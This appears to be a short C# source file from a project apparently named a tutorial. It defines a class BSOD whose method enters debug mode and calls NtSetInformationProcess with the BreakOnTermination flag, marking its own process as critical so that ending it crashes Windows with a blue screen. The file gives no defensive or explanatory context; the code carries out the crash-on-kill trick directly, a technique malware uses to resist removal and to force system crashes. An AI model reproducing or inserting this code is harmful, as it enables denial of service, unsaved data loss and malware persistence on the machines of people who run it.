﻿using Cluttscape_tutorial;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GKDI
{
    internal class BSOD
    {
        public void BSODTIGGER() 
        {
            Process.EnterDebugMode();
            dport.NtSetInformationProcess(Process.GetCurrentProcess().Handle, dport.BreakOnTermination, ref dport.isCritical, sizeof(int));
        }
    }
}
